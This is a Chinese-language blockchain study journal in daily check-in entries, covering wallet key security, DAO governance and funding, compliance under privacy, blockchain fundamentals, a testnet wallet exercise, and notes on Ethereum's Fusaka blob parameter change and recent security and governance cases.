-   **技术方案**：可以采用**MPC（多方计算）钱包**，将私钥拆分为多个分片，分散存储在不同设备或节点上，无需保管完整私钥；也可以使用**硬件钱包 + 社交恢复**的组合，通过多个可信联系人的签名来恢复钱包，避免单一点丢失风险。
    
-   **产品优化**：通过账户抽象（EIP-4337）实现 “无钥化” 操作，用户用生物识别（指纹 / 面部）替代私钥签名，同时借助智能合约设置转账限额、白名单等风控规则，降低私钥泄露的危害。
    
-   **用户教育**：普及分层钱包架构，将大额资产存入冷钱包，日常小额使用热钱包，并通过助记词加密存储（如离线刻写在金属板上）替代纸质备份。
    

### 2\. 没有中心化机构 / 税收时，公共基础设施谁来维护？如果有税收，又如何分配？

-   **维护主体**：在去中心化网络中，通常由**节点运营商 + 社区治理**共同维护。例如以太坊的验证节点通过质押 ETH 获得收益，同时承担区块打包和网络维护；像 Filecoin 这样的存储网络，矿工通过提供存储空间获得代币奖励，以此支撑基础设施运转。
    
-   **税收与分配**：可通过**链上税收协议**（如对链上交易、NFT 发行收取小额手续费）筹集资金，再通过 DAO（去中心化自治组织）进行链上投票分配，资金优先用于节点激励、安全审计、基础设施升级等公共事务。例如 Arbitrum 的 DAO treasury 通过协议收入积累资金，由社区提案决定资金用途，包括生态补贴和技术研发。
    

### 3\. 没有审查且隐私很强时，如何界定并治理有害信息 / 黑产？

-   **链上治理**：采用**去中心化举报 + 声誉系统**，用户可对涉嫌黑产的地址或交易提交证据，经社区节点多签验证后标记风险地址，并通过智能合约限制其与合规协议的交互。例如 ENS 对涉嫌诈骗的域名进行冻结，依赖社区举报和多签节点的审核。
    
-   **技术识别**：利用 **零知识证明（ZKP）** 实现 “隐私可验证”，例如在隐私交易协议中嵌入合规模块，交易方无需披露具体金额，即可证明资金来源合法；同时通过链上数据分析工具（如 Nansen）监测异常资金流动，识别混币器、勒索资金等黑产行为。
    
-   **跨链协作**：建立去中心化的**合规联盟**，不同公链通过跨链桥共享风险地址库，实现黑产地址的全网拦截，同时与监管机构合作推出 “链上监管沙盒”，在保护隐私的前提下满足反洗钱（AML）要求。
    

### 4\. 去中心化协作下，如何实现公平、可信的分配？

-   **算法驱动分配**：采用基于贡献度的**链上声誉代币**，例如在开源协作协议中，开发者的代码提交、Bug 修复等行为通过智能合约自动量化，分配对应的治理代币；在 DeFi 流动性挖矿中，按资金贡献比例分配收益，避免中心化机构的人为干预。
    
-   **DAO 治理机制**：通过**二次投票**（Quadratic Voting）确保小份额参与者的话语权，例如在 Curve 的 DAO 中，用户投票权重与锁仓代币数量的平方根成正比，防止大额持有者垄断决策；同时引入 “争议仲裁” 模块，对分配不公的提案由社区多签节点进行仲裁。
    
-   **透明审计**：所有分配规则和资金流向通过**链上审计工具**（如 OpenZeppelin Defender）实时公开，任何人可通过区块浏览器验证分配结果，例如 Gitcoin Grants 采用链上匹配资金池，捐赠记录和分配结果完全透明，避免暗箱操作。
<!-- DAILY_CHECKIN_2026-01-13_END -->

# 2026-01-12
<!-- DAILY_CHECKIN_2026-01-12_START -->







## 一、区块链的定义与基础构造

区块链本质上是一种去中心化的分布式账本技术，能够安全、透明且不可篡改地记录网络节点之间的事务数据。其构造以“区块”为核心，多条按时间顺序串联的区块形成完整链条，每个区块内部包含多笔交易数据及元数据，以此保障数据记录的完整性与可追溯性。

从微观角度看，标准区块具备三大特征：核心内容上，包含当前交易记录信息和前一个区块的摘要（哈希值），这是区块串联的关键；存储限制上，每个区块的存储容量存在上限；生成频率上，区块会按固定时间周期打包，例如每10分钟左右生成一个新区块。

## 二、区块链的核心特性

区块链之所以能建立极高的信任度，核心源于三大特性：

其一，不可篡改性。由于每个区块都包含上一个区块的摘要并形成严密逻辑链条，若想修改历史区块信息，必须同步修改该区块之后的所有区块，这在实践中几乎无法实现，从技术层面锁定了数据真实性。

其二，公开透明与匿名性。区块链上的所有信息对全网公开，任何人都可顺着区块链条查询历史全部记录，比如查询某个钱包的余额，但用户身份以匿名形式呈现，无法关联到真实个人或主体，实现了“公开可查、隐私保护”的平衡。

其三，快速交易性。相较于传统跨国汇款等业务，区块链交易更具便捷性，无论交易金额大小、交易双方所在地相隔远近，只要交易记录被成功打包进区块，即可视为交易自动完成，大幅缩短了交易周期。

## 三、安全与可信机制

为确保历史交易记录真实、不可篡改且具备可信度，区块链采用分布式网络记账模式。在该模式下，区块链网络中存在大量节点（通常称为矿机）共同参与记账，每个节点都会存储一份完整且完全一致的区块链信息。这种全网备份机制形成了强大的容错能力，即便个别节点出现故障、被攻击或篡改数据，整个账本的真实性仍能通过其他节点的备份信息得到保障，从架构上筑牢了安全防线。

## 四、实践行动与产出

近期完成的核心实践工作包括：成功创建MetaMask钱包，在Sepolia测试网络领取测试币并完成转账验证，确保对钱包操作及区块链交易流程的实操掌握；积极参与以太坊中文周会，及时跟进行业核心项目动态；参与co-learning答疑场，解决实操及理论学习中遇到的疑问，深化对区块链技术的理解。通过系列实践，将理论知识与实操应用相结合，切实提升了对区块链生态的实操能力与认知深度。

## 五、周会核心内容纪要

### （一）以太坊Fusaka升级进展

本次升级核心为BPO2参数调整，将Blob目标值提升至每区块14、最大值提升至21。这类调整本质上是在“数据可用性（DA）供给侧”扩容：提高每区块可承载的Blob数量上限与常态目标值，会直接改变Blob供需关系与blob basefee的形成区间，从而对L2（rollup）发布数据的边际成本进行再定价。

此次参数调整的意义主要体现在两点：其一，若供给提升顺利落地，L2的数据发布成本有望下降，进而改善用户侧交易费与批量结算策略；其二，参数上调会把压力从“价格”转移到“传播与验证路径”，对共识层网络传播、区块构建/验证的峰值负载提出更高要求，因此评估时不能只看均值吞吐，必须同步关注区块传播延迟、重组/错过提议等系统性指标（尤其是尾部表现）。这一调整不仅影响L2生态的运营成本与效率，更对以太坊网络整体的稳定性与承载能力提出了新的考验。

### （二）行业典型案例分析

1\. 安全侧案例：ruebit因旧合约定价错误导致重大损失，并出现通过Tornado Cash的洗钱路径。该案例作为典型安全侧样本，其专业含义在于强调“经济逻辑缺陷（economic bug）”的破坏性不亚于传统的权限/重入漏洞：定价、激励、结算等机制一旦存在可被套利的错误，会在极短时间内被自动化资金放大为系统性损失；而后续通过混币工具隐藏资金流向，意味着事件处置不仅是技术修复，还会延伸到追踪、合规与生态信任修复，需从技术、合规、生态三方协同化解风险。

2\. 治理侧案例：Zcash因治理与商业化路径分歧，出现核心团队出走并成立CashZ的情况。这一治理侧样本提醒我们：公链或隐私币项目的长期可持续性不仅取决于密码学与工程实现，更取决于资金安排、决策机制与商业化路径的共识。一旦在核心利益与路线选择上出现结构性分歧，团队分裂、组织重组甚至生态分叉的概率会上升，直接影响路线图兑现能力、开发资源密度与外部合作方的风险评估，进而动摇整个项目生态的根基。
<!-- DAILY_CHECKIN_2026-01-12_END -->
<!-- Content_END -->
